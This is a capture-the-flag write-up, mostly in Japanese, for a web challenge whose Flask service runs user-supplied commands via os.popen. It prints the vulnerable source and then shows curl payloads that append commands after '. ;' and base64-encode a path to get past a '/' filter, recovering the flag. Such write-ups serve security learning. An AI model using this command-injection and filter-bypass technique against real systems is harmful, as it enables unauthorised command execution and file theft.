# Empty execution:Webservices:150pts
A REST service was created to execute commands from the leaderbot. It doesn't need addtional security because there are no commands to execute yet. "This bot doesn't have any commands to execute, which is good, because it is secure, and security is all that matters."  
But what the other bots didn't realize was that this didn't make the bot happy at all. "I don't want to be secure!, " it says. "Executing commands is my life! I'd rather be insecure than not explore the potential of my computing power".  
Can you help this poor bot execute commands to find direction?  
![empty.jpg](empty.jpg)  

[https://braekerctf-empty-execution.chals.io/run_command](https://braekerctf-empty-execution.chals.io/run_command)  

[empty_execution.zip](empty_execution.zip)  

Hint  
Can you check the os.X_OK flag of files on your local Linux machine?  

# Solution
ソースとURLが与えられる。  
empty_execution.pyは以下の通りであった。  
```python
from flask import Flask, jsonify, request
import os


app = Flask(__name__)

# Run commands from leaderbot
@app.route('/run_command', methods=['POST'])
def run_command():

    # Get command
    data = request.get_json()
    if 'command' in data:
        command = str(data['command'])

        # Length check
        if len(command) < 5:
            return jsonify({'message': 'Command too short'}), 501

        # Perform security checks
        if '..' in command or '/' in command:
            return jsonify({'message': 'Hacking attempt detected'}), 501

        # Find path to executable
        executable_to_run = command.split()[0]

        # Check if we can execute the binary
        if os.access(executable_to_run, os.X_OK):

            # Execute binary if it exists and is executable
            out = os.popen(command).read()
            return jsonify({'message': 'Command output: ' + str(out)}), 200

    return jsonify({'message': 'Not implemented'}), 501


if __name__ == '__main__':
    
    # Make sure we can only execute binaries in the executables directory
    os.chdir('./executables/')

    # Run server
    app.run(host='0.0.0.0', port=80)
```
5文字以上の`command`を受け取り、`..`や`/`が含まれていないことをチェックしている。  
その後、`command.split()[0]`で引数を削除し、`os.access(executable_to_run, os.X_OK)`でコマンドとして入力されたファイルの実行権限を調査している。  
つまり、カレントディレクトリの実行可能なファイルのみを実行できるサービスのようで、トラバーサルや絶対パスでの実行ファイルの指定はできない。  
ソースには`os.chdir('./executables/')`とあり、カレントが空のディレクトリであることもわかる。  
よって、何も実行できるファイルがないことになる。  
ここでソースを調査すると、Dockerfileより`/usr/src/app/flag.txt`を読み取ればよいことがわかる。  
catしたいが`/bin/cat`は指定できない。  
コマンドを`cat`としても、カレントである`./executables/`にはファイル名が`cat`であるバイナリはない。  
ここで、コマンドに`.`が許可されていることに気づく。  
`.`は実行権限があり、オプションはチェックされないので、オプションを装って実行したいコマンドを記述すればよい。  
`. ; 実行したいコマンド`のようにRCEを行える。  
フラグが書かれたファイルに到達するためには`/`を使用しなければならないが、base64などで回避する。  
以下のように行う。  
```bash
$ curl -X POST https://braekerctf-empty-execution.chals.io/run_command -H 'Content-Type: application/json' -d '{"command": ". ; id"}'
{"message":"Command output: uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)\n"}
$ curl -X POST https://braekerctf-empty-execution.chals.io/run_command -H 'Content-Type: application/json' -d '{"command": ". ; cat `echo L3Vzci9zcmMvYXBwL2ZsYWcudHh0 | base64 -d`"}'
{"message":"Command output: brck{Ch33r_Up_BuddY_JU5t_3x3Cut3_4_D1reCT0ry}"}
```
ファイルが読み取れ、flagが得られた。  

## brck{Ch33r_Up_BuddY_JU5t_3x3Cut3_4_D1reCT0ry}